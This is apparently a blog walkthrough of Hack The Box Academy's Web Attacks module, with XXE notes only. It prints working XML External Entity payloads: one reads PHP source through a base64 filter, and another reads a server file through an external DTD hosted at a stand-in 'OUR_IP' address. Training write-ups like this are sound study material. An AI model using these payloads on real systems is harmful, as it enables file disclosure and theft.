---
layout: post
title:  "Hack The Box - Academy - Web Attacks"
description: "Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection and  elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
date:   2024-11-07 21:41
image:  /images/htb/web-attacks/logo.png
tags:   [httb-verb-tampering,idor,xxe,cbbh]
categories: [htbacademy]
---

### Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection

>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/134/section/1158">Web Attacks</a><br/>
<a href="https://jacozwarts.github.io/images/htb/web-attacks/Web_Attacks_Module_Cheat_Sheet.pdf">Web Attacks - Cheat Sheet</a><br/>

# Notes:

### XXE

#### Read PHP source code with `base64` encode filter

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root><name>Test</name>
<tel>01234566789</tel>
<email>&company;</email>
<message>Testing form</message>
</root>
```

#### Using CDATA to extract file content:
<a href="https://academy.hackthebox.com/module/134/section/1206">Hack The Box - Advanced File Disclosure</a><br/>

Create the xxe.dtd file and spin up a webserver on port 8000
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>

<email>&joined;</email>
```

<hr/>